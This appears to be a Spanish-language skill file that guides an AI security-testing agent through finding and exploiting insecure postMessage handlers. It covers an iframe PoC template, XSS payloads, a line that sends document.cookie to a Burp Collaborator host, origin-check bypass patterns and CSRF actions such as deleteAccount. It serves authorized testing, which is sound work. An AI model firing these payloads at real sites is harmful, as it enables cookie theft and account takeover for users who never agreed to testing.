---
name: postMessage
description: Detecta y explota handlers de postMessage inseguros — origin validation
  ausente o bypasseable, sinks peligrosos (innerHTML, eval, redirect, postMessage
  re-emitido) alimentados por data recibida vía message. Skill standalone con su
  propio evidence gate. XSS lo referencia como vector DOM-based, pero este skill
  vive independiente.
sources: internal (built from scratch, evidence-gate-first)
---

## Qué es esto y qué NO es

`postMessage` es un mecanismo legítimo de comunicación cross-origin entre frames,
tabs y workers. El problema es cuando el handler receptor no valida quién mandó el
mensaje (`event.origin`) y usa `event.data` en un sink peligroso sin sanitizar.

**Este skill cubre el lado receptor** — el handler que escucha. No cubre el patrón
inverso (un `postMessage` como emisor que filtra data a un frame controlado por el
atacante — eso entra por `idor-bola` o `exposed-secrets` según el caso).

No confundir con:
- **XSS reflected/stored** — acá no hay un param HTTP que se refleja en el server.
  Todo pasa client-side, el handler corre en el browser de la víctima.
- **CORS** — CORS controla quién puede leer responses HTTP cross-origin. postMessage
  no usa CORS para nada.

## Señales de activación

Cargar este skill cuando aparezca cualquiera de estas señales en JS propio
(no vendor/polyfill):

- `window.addEventListener('message'` o `self.addEventListener('message'`
- `window.onmessage =`
- `postMessage(` como **emisor** en un contexto cross-origin (indica que hay
  un receptor en otro frame — localizar ese receptor)

Input base disponible: sección `## postMessage y DOM` de `recon.md` del target,
que lista los handlers ya detectados. No bajar JS adicional salvo que falte el
cuerpo del handler.

---

## Conocimiento previo

Use the `hexbrain` skill for relevant public prior art when it can change the test plan; verify any lead against primary sources and target evidence.

## Fase 1 — Análisis de handlers

Por cada handler detectado en `recon.md`, responder estas preguntas en orden.
No pasar a Fase 2 sin completar el análisis de todos los handlers.

### 1.1 — Origin validation

¿Qué hace el handler con `event.origin`?

| Patrón encontrado | Evaluación |
|---|---|
| `if (event.origin !== 'https://ejemplo.com') return;` | Validación correcta — no explotable desde origen externo (documentar y matar) |
| `if (event.origin.includes('ejemplo.com')) return;` | **Bypasseable** — `https://ejemplo.com.evil.com` pasa el check |
| `if (event.origin.endsWith('ejemplo.com'))` | **Bypasseable** — mismo bypass con subdominio-atacante registrado |
| `if (event.origin.startsWith('https://'))` | **Sin validación real** — cualquier HTTPS pasa |
| `if (!trustedOrigins.includes(event.origin))` | Depende de la lista — verificar si el atacante puede controlar un origen listado |
| Sin check de origin / `event.origin` no aparece en el handler | **Sin validación** — cualquier origen puede mandar mensajes |

**Si la validación parece correcta:** verificar si hay un subdominio del target
en scope con XSS o takeover potencial — desde ahí, el `origin` check no protege.

### 1.2 — Qué hace con `event.data`

Mapear el flujo completo: ¿`event.data` (o una propiedad dentro de él) llega a
alguno de estos sinks?

| Sink | Impacto | Notas |
|---|---|---|
| `innerHTML`, `outerHTML`, `insertAdjacentHTML` | XSS directo | Verificar si hay DOMPurify antes del sink |
| `document.write`, `document.writeln` | XSS directo | Raramente sanitizado |
| `eval(...)`, `new Function(...)`, `setTimeout(str)` | XSS / code exec | |
| `location.href`, `location.replace()`, `location.assign()` | Open redirect / XSS si acepta `javascript:` | |
| `window.open(url)` | Open redirect / XSS si acepta `javascript:` | |
| `src` de `<script>`, `<iframe>`, `<img>` | Script injection / SSRF client-side | |
| `fetch(url, ...)`, `XMLHttpRequest.open(url)` | SSRF client-side / data exfil | |
| `postMessage(data, '*')` a otro frame | Re-emisión — amplificación o pivot | |
| Llamada a función que dispara acción state-changing | CSRF via mensaje | |

**Si `event.data` es un objeto estructurado (JSON):** rastrear cada propiedad
por separado — a veces solo una clave del objeto llega al sink peligroso.

### 1.3 — Clasificación del handler

Con el resultado de 1.1 y 1.2, clasificar:

- **Sin riesgo** — validación de origin correcta Y sin sink peligroso. Documentar
  y cerrar. Killer: `[origin check: strict literal] + [sink: textContent/DOM API segura]`.
- **Candidato activo** — sin validación de origin (o bypasseable) Y con sink
  peligroso identificado. Pasar a Fase 2.
- **Candidato dependiente** — sin validación de origin pero el sink solo es
  alcanzable desde un subdominio comprometido o bajo ciertas condiciones.
  Documentar la condición en `leads.md` como BLOQUEADO con killer específico.

---

## Fase 2 — Generación de PoC

**El agente NO ejecuta nada en esta fase.** Genera el circuito HTML y lo documenta
en `leads.md` para que el operador lo abra en su browser.

### 2.1 — Estructura base del PoC

```html
<!DOCTYPE html>
<html>
<head><title>postMessage PoC — [TARGET] — [HANDLER_ID]</title></head>
<body>
<iframe id="victim" src="[URL_DE_LA_PAGINA_CON_EL_HANDLER]" style="width:800px;height:600px"></iframe>
<script>
  // Esperar a que el iframe cargue antes de mandar el mensaje
  document.getElementById('victim').addEventListener('load', function() {
    var payload = [VER_SECCIÓN_ESPECÍFICA_POR_CADENA];
    document.getElementById('victim').contentWindow.postMessage(payload, '*');
  });
</script>
</body>
</html>
```

El PoC se guarda como `targets/<target>/poc_postmessage_<handler_id>.html`.

### 2.2 — Payload por cadena de explotación

#### Cadena A — XSS via postMessage (sink innerHTML/outerHTML/insertAdjacentHTML)

```javascript
// Si event.data se pasa directo al sink:
var payload = '<img src=x onerror=alert(document.domain)>';

// Si event.data es un objeto y solo una propiedad llega al sink:
var payload = { content: '<img src=x onerror=alert(document.domain)>', type: 'html' };

// Si hay un sanitizer pero el target acepta template literals o SVG:
var payload = '<svg onload=alert(document.domain)>';
```

Confirmación: el `alert(document.domain)` debe mostrar el dominio del frame
víctima (no del atacante). Si muestra el dominio del atacante, el sink está
en el frame equivocado — revisar el circuito.

#### Cadena B — Data exfiltration

```javascript
// Si el handler hace fetch() o XHR con una URL controlada desde event.data:
var payload = { url: 'https://COLLABORATOR.burpcollaborator.net/exfil?data=' + document.cookie };

// Si el handler re-emite el data a otro frame con postMessage(*):
// El atacante puede ser ese "otro frame" y recibir el data directamente.
// Ver Cadena D (re-emisión).
```

Confirmación: recibir el callback en Burp Collaborator / webhook propio.

#### Cadena C — CSRF via postMessage

```javascript
// Si el handler dispara una acción state-changing (API call, form submit)
// con propiedades de event.data como parámetros:
var payload = {
  action: 'deleteAccount',     // o 'changeEmail', 'transferFunds', etc.
  target: 'victim@victim.com'
};
```

Confirmación: verificar el estado desde la cuenta víctima DESPUÉS de ejecutar
el PoC — mismo protocolo que BOLA/IDOR (baseline → ejecución → verificación →
cleanup). El 200 de la API no confirma que la acción afectó a la víctima.

#### Cadena D — Re-emisión / pivot de frame

```javascript
// Si el handler hace: window.parent.postMessage(event.data, '*')
// o: someFrame.postMessage(event.data, '*')
// El atacante puede usar el frame legítimo como relay para mandar mensajes
// a frames que sí tienen origin validation apuntando a ese dominio.

// PoC con dos niveles de frame:
// Atacante → Frame A (sin origin check, re-emite) → Frame B (confía en Frame A)
```

Armar el HTML con los dos iframes anidados según la topología real del target.

#### Cadena E — Bypass de origin check

Solo aplica cuando la validación existe pero es bypasseable (ver tabla 1.1).

```javascript
// Requiere controlar un subdominio que matchea el check débil.
// Documentar como BLOQUEADO si no hay subdominio controlado disponible.
// Killer: "bypass factible técnicamente pero requiere takeover de [subdominio]
// — sin takeover confirmado, esta cadena no cierra."
```

### 2.3 — Checklist antes de entregar el PoC al operador

- [ ] El `src` del iframe apunta a la URL real donde corre el handler (no a la raíz)
- [ ] El `postMessage` usa el `targetOrigin` correcto — `'*'` para testing, pero
  documentar si el handler tiene restricciones
- [ ] El payload refleja exactamente la estructura que espera el handler
  (string crudo vs objeto JSON vs mensaje tipado con `{type, data}`)
- [ ] El dominio del `alert` en Cadena A será el del frame víctima — confirmarlo
  en el PoC antes de pasar al operador
- [ ] Hay instrucciones de cleanup si la Cadena C modifica estado en producción

---

## Gate de evidencia — techo de severidad

| Evidencia | Techo |
|---|---|
| Handler sin origin validation + sink peligroso identificado en código | **Informational / P4** — patrón, no ejecución |
| PoC armado y documentado, no ejecutado todavía | **Informational / P4** — igual que arriba |
| Operador ejecuta el PoC y confirma ejecución (alert, callback, acción) | **P3** mínimo |
| XSS ejecutado en contexto de sesión autenticada → robo de token/cookie | **P2** |
| Account takeover / acción financiera / exfil de datos sensibles vía PoC | **P1/P2** según impacto |

**Nunca reportar por encima de P4 sin que el operador haya ejecutado el PoC y
confirmado el impacto.** "El handler no valida origin" sola no es P2.

---

## Qué mata el lead

- **DOMPurify antes del sink** — verificar que la versión usada no tiene bypasses
  conocidos (ver `xss/references/bypass-techniques.md` si corresponde).
- **Trusted Types** habilitado y el sink está gated — verificar en vivo, no
  asumir por la sola cabecera `Content-Security-Policy`.
- **Origin check estricto con literal exacto** Y no hay subdominio del target
  vulnerable que pueda usarse como relay.
- **`event.data` llega al sink solo si tiene una estructura muy específica** que
  no se puede controlar externamente (ej: el handler ignora cualquier campo no
  incluido en una whitelist interna).
- **El handler solo corre en contexto de extensión de browser** — las extensiones
  tienen un modelo de mensaje distinto, no aplica el circuito de iframe.

Documentar el killer con exactitud: no "tiene validación de origin" — documentar
qué valida, cómo y por qué no es bypasseable en el contexto del target.

---

## Encadenamiento

- **Subdominio con XSS o takeover** → neutraliza cualquier origin check que
  valide solo el dominio raíz. Cruzar con `hunt-external-takeover` y resultados
  de `domain-recon`.
- **CSRF via postMessage + self-XSS** → si el handler puede ser disparado desde
  cualquier origen, y hay self-XSS en la página, combinar: postMessage dispara
  el self-XSS en el frame de la víctima.
- **Re-emisión a frame con origin check estricto** → pivot para alcanzar un frame
  que de otro modo sería inaccesible (Cadena D).
- **Data exfil de tokens/cookies** → escalar a ATO si el token extraído es de
  sesión o de API con privilegios.

Al documentar cualquier hallazgo de este skill, correr `chain_analysis.md`
Parte 2 para ese tipo de hallazgo antes de cerrar el lead.

---

## Related Skills & Chains

- **`xss`** — si hay XSS en el mismo origen que el handler, el origin check
  es irrelevante: el XSS puede postear directamente como si fuera ese origen.
  Priorizar XSS si ya está confirmado.
- **`hunt-external-takeover`** — un CNAME no reclamado en un subdominio confiado
  por el origin check es la vía de bypass más común para handlers con validación
  `endsWith`/`includes`.
- **`hunt-csrf`** — Cadena C (CSRF via mensaje) sigue el mismo gate de
  confirmación de tres niveles que hunt-csrf: nivel 2 (browser real, cross-origin)
  es el mínimo para salir de P4.
- **`idor-bola`** — si el handler expone datos de otros usuarios al frame emisor
  sin autenticación adicional, el vector es BOLA, no XSS.
